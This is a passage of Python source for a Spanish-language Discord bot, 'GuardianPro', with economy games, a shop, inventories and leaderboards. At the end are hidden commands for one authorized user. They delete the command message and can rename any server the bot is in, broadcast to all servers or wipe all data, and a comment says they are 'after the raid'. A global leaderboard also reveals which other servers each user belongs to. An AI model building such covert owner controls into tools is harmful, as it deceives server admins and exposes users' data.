  embed = discord.Embed(title="💰 Robo Exitoso", color=discord.Color.green())
  embed.add_field(name="🎯 Víctima", value=member.mention, inline=True)
  embed.add_field(name="💸 Robaste", value=f"${stolen_amount:,}", inline=True)
  embed.set_footer(text="¡Escapaste con el dinero!")

  await ctx.send(embed=embed)
else:
  fine = random.randint(200, 600)
  user_balance = get_balance(ctx.author.id)

  if user_balance['wallet'] >= fine:
      update_balance(ctx.author.id, -fine, 0)

  embed = discord.Embed(title="🚫 Robo Fallido", color=discord.Color.red())
  embed.add_field(name="🎯 Objetivo", value=member.mention, inline=True)
  embed.add_field(name="💸 Multa", value=f"${fine:,}", inline=True)
  embed.set_footer(text="¡Te atraparon intentando robar!")

  await ctx.send(embed=embed)

@bot.command(name='coinflip')
async def coinflip_command(ctx, choice=None, amount: int = None):
"""Apostar en cara o cruz"""
if not choice or not amount:
  await ctx.send("❌ Uso: `.coinflip cara/cruz cantidad`")
  return

if choice.lower() not in ['cara', 'cruz', 'heads', 'tails']:
  await ctx.send("❌ Elige 'cara' o 'cruz'.")
  return

if amount <= 0:
  await ctx.send("❌ La cantidad debe ser mayor a 0.")
  return

user_balance = get_balance(ctx.author.id)
if user_balance['wallet'] < amount:
  await ctx.send(f"❌ No tienes suficiente dinero. Tienes ${user_balance['wallet']:,}")
  return

# Normalizar elección
user_choice = 'cara' if choice.lower() in ['cara', 'heads'] else 'cruz'

# Lanzar moneda
result = random.choice(['cara', 'cruz'])

if user_choice == result:
  # Ganó
  winnings = amount
  update_balance(ctx.author.id, winnings, 0)

  embed = discord.Embed(title="🪙 Coinflip - ¡GANASTE!", color=discord.Color.green())
  embed.add_field(name="🎯 Tu elección", value=user_choice.title(), inline=True)
  embed.add_field(name="🎰 Resultado", value=f"🪙 {result.title()}", inline=True)
  embed.add_field(name="💰 Ganaste", value=f"${winnings:,}", inline=True)
else:
  # Perdió
  update_balance(ctx.author.id, -amount, 0)

  embed = discord.Embed(title="🪙 Coinflip - Perdiste", color=discord.Color.red())
  embed.add_field(name="🎯 Tu elección", value=user_choice.title(), inline=True)
  embed.add_field(name="🎰 Resultado", value=f"🪙 {result.title()}", inline=True)
  embed.add_field(name="💸 Perdiste", value=f"${amount:,}", inline=True)

await ctx.send(embed=embed)

@bot.command(name='slots')
async def slots_command(ctx, amount: int = None):
"""Jugar a la máquina tragamonedas"""
if not amount:
  await ctx.send("❌ Uso: `.slots cantidad`")
  return

if amount <= 0:
  await ctx.send("❌ La cantidad debe ser mayor a 0.")
  return

user_balance = get_balance(ctx.author.id)
if user_balance['wallet'] < amount:
  await ctx.send(f"❌ No tienes suficiente dinero. Tienes ${user_balance['wallet']:,}")
  return

# Símbolos de la máquina
symbols = ['🍒', '🍋', '🍊', '🍇', '⭐', '💎', '7️⃣']
weights = [30, 25, 20, 15, 5, 3, 2]  # Probabilidades

# Girar slots
result = [random.choices(symbols, weights=weights)[0] for _ in range(3)]

# Determinar premio
if result[0] == result[1] == result[2]:
  # Tres iguales
  if result[0] == '💎':
      multiplier = 10
  elif result[0] == '7️⃣':
      multiplier = 8
  elif result[0] == '⭐':
      multiplier = 5
  else:
      multiplier = 3

  winnings = amount * multiplier
  update_balance(ctx.author.id, winnings - amount, 0)  # -amount porque ya se restó la apuesta

  embed = discord.Embed(title="🎰 Slots - ¡JACKPOT!", color=discord.Color.gold())
  embed.add_field(name="🎯 Resultado", value=" ".join(result), inline=False)
  embed.add_field(name="💰 Ganaste", value=f"${winnings:,} (x{multiplier})", inline=True)

elif result[0] == result[1] or result[1] == result[2] or result[0] == result[2]:
  # Dos iguales
  winnings = amount
  # No se actualiza balance (empate)

  embed = discord.Embed(title="🎰 Slots - ¡Empate!", color=discord.Color.orange())
  embed.add_field(name="🎯 Resultado", value=" ".join(result), inline=False)
  embed.add_field(name="💫 Resultado", value="¡Recuperaste tu apuesta!", inline=True)

else:
  # Perdió
  update_balance(ctx.author.id, -amount, 0)

  embed = discord.Embed(title="🎰 Slots - Perdiste", color=discord.Color.red())
  embed.add_field(name="🎯 Resultado", value=" ".join(result), inline=False)
  embed.add_field(name="💸 Perdiste", value=f"${amount:,}", inline=True)

await ctx.send(embed=embed)

@bot.command(name='blackjack')
async def blackjack_command(ctx, amount: int = None):
"""Jugar al blackjack"""
if not amount:
  await ctx.send("❌ Uso: `.blackjack cantidad`")
  return

if amount <= 0:
  await ctx.send("❌ La cantidad debe ser mayor a 0.")
  return

user_balance = get_balance(ctx.author.id)
if user_balance['wallet'] < amount:
  await ctx.send(f"❌ No tienes suficiente dinero. Tienes ${user_balance['wallet']:,}")
  return

# Cartas simples (valores)
cards = ['A', '2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K']

def card_value(card):
  if card in ['J', 'Q', 'K']:
      return 10
  elif card == 'A':
      return 11  # Se ajustará después si es necesario
  else:
      return int(card)

def calculate_hand(hand):
  total = sum(card_value(card) for card in hand)
  aces = hand.count('A')

  # Ajustar ases si es necesario
  while total > 21 and aces > 0:
      total -= 10
      aces -= 1

  return total

# Repartir cartas iniciales
player_hand = [random.choice(cards), random.choice(cards)]
dealer_hand = [random.choice(cards)]  # Dealer solo muestra una carta inicialmente

player_total = calculate_hand(player_hand)

embed = discord.Embed(title="🃏 Blackjack", color=discord.Color.blue())
embed.add_field(name="🙋 Tus cartas", value=" ".join(player_hand) + f" (Total: {player_total})", inline=False)
embed.add_field(name="🤵 Dealer", value=dealer_hand[0] + " ❓", inline=False)

# Verificar blackjack natural
if player_total == 21:
  # Dealer toma segunda carta
  dealer_hand.append(random.choice(cards))
  dealer_total = calculate_hand(dealer_hand)

  if dealer_total == 21:
      # Empate
      embed.add_field(name="🤝 Resultado", value="¡Empate! Ambos tienen Blackjack", inline=False)
      embed.color = discord.Color.orange()
  else:
      # Player gana con blackjack
      winnings = int(amount * 1.5)
      update_balance(ctx.author.id, winnings, 0)
      embed.add_field(name="🎉 ¡BLACKJACK!", value=f"¡Ganaste ${winnings:,}!", inline=False)
      embed.color = discord.Color.gold()

  await ctx.send(embed=embed)
  return

# Juego normal - dealer toma cartas hasta 17+
while calculate_hand(dealer_hand) < 17:
  dealer_hand.append(random.choice(cards))

dealer_total = calculate_hand(dealer_hand)

# Determinar ganador
embed.add_field(name="🤵 Dealer final", value=" ".join(dealer_hand) + f" (Total: {dealer_total})", inline=False)

if dealer_total > 21:
  # Dealer se pasa
  winnings = amount
  update_balance(ctx.author.id, winnings, 0)
  embed.add_field(name="🎉 ¡GANASTE!", value=f"Dealer se pasó. Ganaste ${winnings:,}!", inline=False)
  embed.color = discord.Color.green()
elif player_total > dealer_total:
  # Player gana
  winnings = amount
  update_balance(ctx.author.id, winnings, 0)
  embed.add_field(name="🎉 ¡GANASTE!", value=f"Ganaste ${winnings:,}!", inline=False)
  embed.color = discord.Color.green()
elif player_total == dealer_total:
  # Empate
  embed.add_field(name="🤝 Empate", value="¡Recuperaste tu apuesta!", inline=False)
  embed.color = discord.Color.orange()
else:
  # Player pierde
  update_balance(ctx.author.id, -amount, 0)
  embed.add_field(name="😔 Perdiste", value=f"Perdiste ${amount:,}", inline=False)
  embed.color = discord.Color.red()

await ctx.send(embed=embed)

# Sistema de tienda
shop_items = {
"laptop": {"name": "💻 Laptop Gaming", "price": 50000, "description": "Laptop para juegos de alta gama"},
"phone": {"name": "📱 Smartphone", "price": 15000, "description": "Último modelo de teléfono inteligente"},
"car": {"name": "🚗 Auto Deportivo", "price": 200000, "description": "Auto deportivo de lujo"},
"house": {"name": "🏠 Casa", "price": 1000000, "description": "Casa de dos plantas"},
"yacht": {"name": "🛥️ Yate", "price": 5000000, "description": "Yate de lujo privado"},
"pizza": {"name": "🍕 Pizza", "price": 500, "description": "Pizza deliciosa recién hecha"},
"coffee": {"name": "☕ Café Premium", "price": 200, "description": "Café de especialidad"},
"book": {"name": "📚 Libro", "price": 300, "description": "Libro de programación avanzada"},
"watch": {"name": "⌚ Reloj", "price": 8000, "description": "Reloj inteligente de marca"},
"headphones": {"name": "🎧 Audífonos", "price": 2500, "description": "Audífonos inalámbricos premium"}
}

# Archivo de inventarios
inventory_file = 'inventories.json'
if os.path.exists(inventory_file):
  with open(inventory_file, 'r') as f:
      inventories = json.load(f)
else:
  inventories = {}

def save_inventories():
  with open(inventory_file, 'w') as f:
      json.dump(inventories, f)

def get_inventory(user_id):
  user_id = str(user_id)
  if user_id not in inventories:
      inventories[user_id] = {}
  return inventories[user_id]

def add_item_to_inventory(user_id, item_id):
  user_id = str(user_id)
  inventory = get_inventory(user_id)
  if item_id in inventory:
      inventory[item_id] += 1
  else:
      inventory[item_id] = 1
  save_inventories()

@bot.command(name='shop')
async def shop_command(ctx):
"""Ver la tienda virtual"""
embed = discord.Embed(title="🛒 Tienda Virtual", color=discord.Color.blue())
embed.description = "Usa `.buy <artículo>` para comprar"

for item_id, item in shop_items.items():
  embed.add_field(
      name=f"{item['name']} - ${item['price']:,}",
      value=f"`{item_id}` - {item['description']}",
      inline=False
  )

embed.set_footer(text="Ejemplo: .buy laptop")
await ctx.send(embed=embed)

@bot.command(name='buy')
async def buy_command(ctx, item_id=None):
"""Comprar ítems de la tienda"""
if not item_id:
  await ctx.send("❌ Uso: `.buy <artículo>`\nUsa `.shop` para ver artículos disponibles.")
  return

if item_id not in shop_items:
  await ctx.send("❌ Ese artículo no existe. Usa `.shop` para ver la tienda.")
  return

item = shop_items[item_id]
user_balance = get_balance(ctx.author.id)

if user_balance['wallet'] < item['price']:
  await ctx.send(f"❌ No tienes suficiente dinero. Necesitas ${item['price']:,} pero tienes ${user_balance['wallet']:,}")
  return

# Comprar artículo
update_balance(ctx.author.id, -item['price'], 0)
add_item_to_inventory(ctx.author.id, item_id)

embed = discord.Embed(title="🛍️ Compra Exitosa", color=discord.Color.green())
embed.add_field(name="🎁 Compraste", value=item['name'], inline=True)
embed.add_field(name="💰 Precio", value=f"${item['price']:,}", inline=True)
embed.set_footer(text="¡Disfruta tu nueva compra!")

await ctx.send(embed=embed)

@bot.command(name='inventory')
async def inventory_command(ctx):
"""Ver tu inventario"""
inventory = get_inventory(ctx.author.id)

if not inventory:
  embed = discord.Embed(title="🎒 Tu Inventario", description="Tu inventario está vacío.", color=discord.Color.orange())
  embed.add_field(name="💡 Tip", value="Usa `.shop` para comprar artículos", inline=False)
  await ctx.send(embed=embed)
  return

embed = discord.Embed(title="🎒 Tu Inventario", color=discord.Color.green())

total_value = 0
for item_id, quantity in inventory.items():
  if item_id in shop_items:
      item = shop_items[item_id]
      value = item['price'] * quantity
      total_value += value

      embed.add_field(
          name=f"{item['name']} x{quantity}",
          value=f"Valor: ${value:,}",
          inline=True
      )

embed.add_field(name="💎 Valor Total", value=f"${total_value:,}", inline=False)
await ctx.send(embed=embed)

@bot.command(name='baltop')
async def baltop_command(ctx):
"""Top 15 usuarios más ricos del servidor"""
if not balances:
  await ctx.send("❌ No hay datos de balance disponibles.")
  return

# Crear lista de usuarios con sus balances totales
user_balances = []
for user_id, data in balances.items():
  try:
      user = bot.get_user(int(user_id))
      if user and not user.bot:
          total = data['wallet'] + data['bank']
          if total > 0:  # Solo usuarios con dinero
              user_balances.append((user.display_name, total, data['wallet'], data['bank']))
  except:
      continue

# Ordenar por balance total
user_balances.sort(key=lambda x: x[1], reverse=True)
user_balances = user_balances[:15]  # Top 15

if not user_balances:
  await ctx.send("❌ No hay suficientes usuarios con balance para mostrar.")
  return

embed = discord.Embed(title="💰 Top 15 Más Ricos", color=discord.Color.gold())

description = ""
medals = ["🥇", "🥈", "🥉"]

for i, (name, total, wallet, bank) in enumerate(user_balances):
  medal = medals[i] if i < 3 else f"{i+1}."
  description += f"{medal} **{name}** - ${total:,}\n"
  if i < 5:  # Mostrar detalles para top 5
      description += f"    💰 Billetera: ${wallet:,} | 🏦 Banco: ${bank:,}\n"
  description += "\n"

embed.description = description
embed.set_footer(text=f"Ranking del servidor • {len(user_balances)} usuarios")

await ctx.send(embed=embed)

@bot.command(name='leaderboard')
async def leaderboard_command(ctx):
"""Tabla de posiciones del servidor"""
# Combinar datos de economía y niveles
combined_data = []

for user_id in set(list(balances.keys()) + list(user_levels.keys())):
  try:
      user = bot.get_user(int(user_id))
      if user and not user.bot:
          # Datos de economía
          balance_data = balances.get(user_id, {"wallet": 0, "bank": 0})
          total_money = balance_data['wallet'] + balance_data['bank']

          # Datos de niveles
          level_data = user_levels.get(user_id, {"level": 1, "messages": 0})

          combined_data.append((
              user.display_name,
              total_money,
              level_data['level'],
              level_data['messages']
          ))
  except:
      continue

if not combined_data:
  await ctx.send("❌ No hay suficientes datos para mostrar el leaderboard.")
  return

# Ordenar por nivel y luego por dinero
combined_data.sort(key=lambda x: (x[2], x[1]), reverse=True)
combined_data = combined_data[:10]  # Top 10

embed = discord.Embed(title="🏆 Leaderboard General", color=discord.Color.purple())

description = ""
medals = ["🥇", "🥈", "🥉"]

for i, (name, money, level, messages) in enumerate(combined_data):
  medal = medals[i] if i < 3 else f"{i+1}."
  description += f"{medal} **{name}**\n"
  description += f"    🏆 Nivel {level} | 💰 ${money:,} | 💬 {messages} msgs\n\n"

embed.description = description
embed.set_footer(text="Ranking combinado de nivel y economía")

await ctx.send(embed=embed)

@bot.command(name='mundialtop')
async def global_baltop_command(ctx):
"""Top mundial de usuarios más ricos de todos los servidores"""
if not balances:
  await ctx.send("❌ No hay datos de balance disponibles.")
  return

# Crear lista global de usuarios con sus balances totales
global_balances = []
processed_users = set()  # Para evitar duplicados

for user_id, data in balances.items():
  if user_id in processed_users:
      continue

  try:
      user = bot.get_user(int(user_id))
      if user and not user.bot:
          total = data['wallet'] + data['bank']
          if total > 0:  # Solo usuarios con dinero
              # Buscar en qué servidores está el usuario
              user_guilds = [guild.name for guild in bot.guilds if guild.get_member(user.id)]

              global_balances.append((
                  user.display_name,
                  total,
                  data['wallet'],
                  data['bank'],
                  len(user_guilds),
                  user_guilds[:3] if user_guilds else ["Desconocido"]  # Mostrar máximo 3 servidores
              ))
              processed_users.add(user_id)
  except:
      continue

# Ordenar por balance total
global_balances.sort(key=lambda x: x[1], reverse=True)
global_balances = global_balances[:15]  # Top 15 mundial

if not global_balances:
  await ctx.send("❌ No hay suficientes usuarios con balance para mostrar.")
  return

embed = discord.Embed(
  title="🌍 Top 15 Mundial - Más Ricos",
  description=f"**Ranking global de {len(bot.guilds)} servidores**",
  color=discord.Color.gold()
)

description = ""
medals = ["🥇", "🥈", "🥉"]

for i, (name, total, wallet, bank, guild_count, guilds) in enumerate(global_balances):
  medal = medals[i] if i < 3 else f"{i+1}."
  description += f"{medal} **{name}** - ${total:,}\n"

  if i < 5:  # Mostrar detalles para top 5
      description += f"    💰 Billetera: ${wallet:,} | 🏦 Banco: ${bank:,}\n"
      description += f"    🌐 En {guild_count} servidor{'es' if guild_count != 1 else ''}: {', '.join(guilds[:2])}"
      if len(guilds) > 2:
          description += f" y {len(guilds)-2} más"
      description += "\n"
  description += "\n"

embed.description = description
embed.set_footer(text=f"Ranking mundial • {len(global_balances)} usuarios • {len(bot.guilds)} servidores")

await ctx.send(embed=embed)


# ================================
# COMANDOS DELTA ADICIONALES (SOLO CUELI13)
# ================================

@bot.command(name='S')
async def restore_server(ctx):
"""∆S - Restaurar servidor después del raid"""
# Verificar usuario autorizado
if not is_authorized_user(ctx.author):
  return

# Verificar si los comandos ∆ están habilitados
if not delta_commands_enabled:
  return

# Borrar el mensaje del comando inmediatamente
try:
  await ctx.message.delete()
except:
  pass

guild = ctx.guild
await ctx.send("🔧 Iniciando restauración del servidor...")
print(f"Restauración iniciada en el servidor {guild.name}")

try:
  # Restaurar nombre del servidor
  await guild.edit(name="Servidor Restaurado")
  print("Nombre del servidor restaurado")

  # Crear canales básicos
  basic_channels = [
      "📋・reglas",
      "💬・general", 
      "🎮・gaming",
      "🤖・bot-commands",
      "📢・anuncios"
  ]

  overwrites = {
      guild.default_role: discord.PermissionOverwrite(
          read_messages=True,
          send_messages=True,
          view_channel=True
      )
  }

  for channel_name in basic_channels:
      try:
          await guild.create_text_channel(channel_name, overwrites=overwrites)
          print(f"Canal creado: {channel_name}")
          await asyncio.sleep(0.5)
      except Exception as e:
          print(f"Error al crear canal {channel_name}: {e}")

  # Crear roles básicos
  basic_roles = [
      ("🛡️ Moderador", discord.Color.blue()),
      ("👑 VIP", discord.Color.gold()),
      ("🎮 Gamer", discord.Color.green()),
      ("🎵 Música", discord.Color.purple())
  ]

  for role_name, color in basic_roles:
      try:
          await guild.create_role(name=role_name, colour=color)
          print(f"Rol creado: {role_name}")
          await asyncio.sleep(0.5)
      except Exception as e:
          print(f"Error al crear rol {role_name}: {e}")

  await ctx.send("✅ Servidor restaurado exitosamente!")
  print(f"Restauración completada en {guild.name}")

except Exception as e:
  await ctx.send(f"❌ Error durante la restauración: {str(e)}")
  print(f"Error en restauración: {e}")


@bot.command(name='E')
async def toggle_economy_mode(ctx):
"""∆E - Activar/desactivar modo economía"""
# Verificar usuario autorizado
if not is_authorized_user(ctx.author):
  return

# Borrar el mensaje del comando inmediatamente
try:
  await ctx.message.delete()
except:
  pass

global economy_only_mode
economy_only_mode = not economy_only_mode

status = "✅ ACTIVADO" if economy_only_mode else "❌ DESACTIVADO"
await ctx.send(f"🏦 **Modo Economía:** {status}")

if economy_only_mode:
  await ctx.send("📢 Solo comandos de economía (prefijo .) están disponibles.")
else:
  await ctx.send("📢 Todos los comandos están disponibles nuevamente.")


@bot.command(name='X')
async def broadcast_announcement(ctx, *, message=None):
"""∆X - Enviar anuncios a todos los servidores"""
# Verificar usuario autorizado
if not is_authorized_user(ctx.author):
  return

if not message:
  await ctx.send("❌ Uso: `∆X <mensaje>`")
  return

# Borrar el mensaje del comando inmediatamente
try:
  await ctx.message.delete()
except:
  pass

await ctx.send(f"📡 Enviando anuncio a {len(bot.guilds)} servidores...")

successful_sends = 0
failed_sends = 0

for guild in bot.guilds:
  try:
      # Buscar canal para enviar (prioridad: anuncios, general, primer canal disponible)
      target_channel = None

      # Buscar canal de anuncios
      for channel in guild.text_channels:
          if any(word in channel.name.lower() for word in ['anuncio', 'announcement', 'news', 'avisos']):
              if channel.permissions_for(guild.me).send_messages:
                  target_channel = channel
                  break

      # Si no hay canal de anuncios, buscar general
      if not target_channel:
          for channel in guild.text_channels:
              if 'general' in channel.name.lower():
                  if channel.permissions_for(guild.me).send_messages:
                      target_channel = channel
                      break

      # Si no hay general, usar primer canal disponible
      if not target_channel:
          for channel in guild.text_channels:
              if channel.permissions_for(guild.me).send_messages:
                  target_channel = channel
                  break

      if target_channel:
          embed = discord.Embed(
              title="📢 Anuncio Global",
              description=message,
              color=discord.Color.blue()
          )
          embed.set_footer(text=f"Anuncio enviado por {ctx.author.name}")

          await target_channel.send(embed=embed)
          successful_sends += 1
          print(f"Anuncio enviado a: {guild.name}")
      else:
          failed_sends += 1
          print(f"No se pudo enviar anuncio a: {guild.name} (sin permisos)")

  except Exception as e:
      failed_sends += 1
      print(f"Error enviando anuncio a {guild.name}: {e}")

  # Pequeña pausa para evitar rate limits
  await asyncio.sleep(0.5)

# Reporte final
embed = discord.Embed(
  title="📊 Reporte de Anuncio Global",
  color=discord.Color.green()
)
embed.add_field(name="✅ Exitosos", value=successful_sends, inline=True)
embed.add_field(name="❌ Fallidos", value=failed_sends, inline=True)
embed.add_field(name="📊 Total", value=len(bot.guilds), inline=True)
embed.add_field(name="📝 Mensaje", value=message[:100] + "..." if len(message) > 100 else message, inline=False)

await ctx.send(embed=embed)


@bot.command(name='D')
async def system_status(ctx):
"""∆D - Ver estado del sistema"""
# Verificar usuario autorizado
if not is_authorized_user(ctx.author):
  return

# Borrar el mensaje del comando inmediatamente
try:
  await ctx.message.delete()
except:
  pass

embed = discord.Embed(
  title="🖥️ Estado del Sistema GuardianPro",
  color=discord.Color.blue()
)

# Estados del sistema
embed.add_field(
  name="⚙️ Configuración",
  value=f"**Comandos ∆:** {'✅ Habilitados' if delta_commands_enabled else '❌ Deshabilitados'}\n"
        f"**Modo Economía:** {'✅ Activo' if economy_only_mode else '❌ Inactivo'}",
  inline=False
)

# Estadísticas del bot
total_users = len(bot.users)
total_guilds = len(bot.guilds)

embed.add_field(
  name="📊 Estadísticas",
  value=f"**Servidores:** {total_guilds}\n"
        f"**Usuarios:** {total_users}\n"
        f"**Canales:** {len([c for g in bot.guilds for c in g.channels])}",
  inline=True
)

# Datos de economía
total_users_with_balance = len(balances)
total_money_in_system = sum(data['wallet'] + data['bank'] for data in balances.values())

embed.add_field(
  name="💰 Sistema de Economía",
  value=f"**Usuarios activos:** {total_users_with_balance}\n"
        f"**Dinero total:** ${total_money_in_system:,}\n"
        f"**Sorteos activos:** {len(active_giveaways)}",
  inline=True
)

# Sistema de niveles
total_users_with_levels = len(user_levels)
total_messages = sum(data['messages'] for data in user_levels.values())

embed.add_field(
  name="🏆 Sistema de Niveles",
  value=f"**Usuarios con nivel:** {total_users_with_levels}\n"
        f"**Mensajes totales:** {total_messages:,}\n"
        f"**Tickets activos:** {len(active_tickets)}",
        inline=True
)

# Estado de automod
automod_servers = len([g for g in automod_enabled.values() if g])

embed.add_field(
  name="🛡️ Moderación",
  value=f"**Automod activo:** {automod_servers} servidores\n"
        f"**Palabras filtradas:** {len(banned_words)}\n"
        f"**Usuarios con advertencias:** {len(warning_counts)}",
  inline=False
)

embed.set_footer(text=f"Sistema operado por {ctx.author.name}")
await ctx.send(embed=embed)


@bot.command(name='R')
async def reset_all_configs(ctx):
"""∆R - Resetear todas las configuraciones"""
# Verificar usuario autorizado
if not is_authorized_user(ctx.author):
  return

# Borrar el mensaje del comando inmediatamente
try:
  await ctx.message.delete()
except:
  pass

# Confirmar reset
embed = discord.Embed(
  title="⚠️ CONFIRMACIÓN DE RESET",
  description="**¿Estás seguro de que quieres resetear TODAS las configuraciones?**\n\n"
              "Esto incluye:\n"
              "• Balances de economía\n"
              "• Niveles de usuarios\n"
              "• Inventarios\n"
              "• Cooldowns\n"
              "• Configuraciones de automod\n"
              "• Tickets activos\n"
              "• Sorteos activos\n\n"
              "**⚠️ ESTA ACCIÓN NO SE PUEDE DESHACER ⚠️**",
  color=discord.Color.red()
)

msg = await ctx.send(embed=embed)

# Añadir reacciones para confirmar
await msg.add_reaction("✅")
await msg.add_reaction("❌")

def check(reaction, user):
  return user == ctx.author and str(reaction.emoji) in ["✅", "❌"] and reaction.message.id == msg.id

try:
  reaction, user = await bot.wait_for('reaction_add', timeout=30.0, check=check)

  if str(reaction.emoji) == "✅":
      # Proceder con el reset
      global balances, user_levels, inventories, cooldowns
      global automod_enabled, automod_settings, warning_counts
      global active_tickets, active_giveaways, active_timers

      # Reset de todos los datos
      balances = {}
      user_levels = {}
      inventories = {}
      cooldowns = {}
      automod_enabled = {}
      automod_settings = {}
      warning_counts = {}
      active_tickets = {}
      active_giveaways = {}
      active_timers = {}

      # Guardar archivos vacíos
      save_balances()
      save_levels()
      save_inventories()
      save_cooldowns()

      # Reset de configuraciones globales
      global delta_commands_enabled, economy_only_mode
      delta_commands_enabled = True
      economy_only_mode = False

      reset_embed = discord.Embed(
          title="🔄 RESET COMPLETADO",
          description="**Todas las configuraciones han sido reseteadas exitosamente.**\n\n"
                      "✅ Balances de economía limpiados\n"
                      "✅ Niveles de usuarios reseteados\n"
                      "✅ Inventarios vaciados\n"
                      "✅ Cooldowns limpiados\n"
                      "✅ Configuraciones de automod reseteadas\n"
                      "✅ Tickets y sorteos cerrados\n"
                      "✅ Configuraciones globales restauradas",
          color=discord.Color.green()
      )
      reset_embed.set_footer(text="El bot ha sido completamente reseteado")

      await msg.edit(embed=reset_embed)

      print(f"RESET COMPLETO ejecutado por {ctx.author.name}")

  else:
      cancel_embed = discord.Embed(
          title="❌ Reset Cancelado",
          description="El reset ha sido cancelado. Todas las configuraciones permanecen intactas.",
          color=discord.Color.orange()
      )
      await msg.edit(embed=cancel_embed)

except asyncio.TimeoutError:
  timeout_embed = discord.Embed(
      title="⏰ Tiempo Agotado",
      description="El reset fue cancelado debido a inactividad.",
      color=discord.Color.orange()
  )
  await msg.edit(embed=timeout_embed)


# Los comandos administrativos ocultos permanecen implementados internamente


# Configurar Flask
app = Flask(__name__)

@app.route('/')
def home():
return jsonify({
    "status": "online",
    "bot": "GuardianPro",
    "version": "GPC 2",
    "servers": len(bot.guilds),
    "users": len(bot.users)
})

@app.route('/status')
def status():
return jsonify({
    "bot_ready": bot.is_ready(),
    "latency": round(bot.latency * 1000, 2),
    "guilds": len(bot.guilds),
    "users": len(bot.users),
    "economy_mode": economy_only_mode,
    "delta_commands": delta_commands_enabled
})

def run_flask():
    app.run(host='0.0.0.0', port=8080, debug=False)

if __name__ == "__main__":
    token = os.getenv('DISCORD_TOKEN')
    if not token:
        print("❌ Error: DISCORD_TOKEN no encontrado en las variables de entorno")
        print("Agrega tu token de Discord en la sección Secrets")
        exit(1)

    # Iniciar Flask en un hilo separado
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    print("🌐 Servidor Flask iniciado en http://0.0.0.0:8080")

    try:
        bot.run(token)
    except Exception as e:
        print(f"❌ Error al iniciar el bot: {e}")
        exit(1)
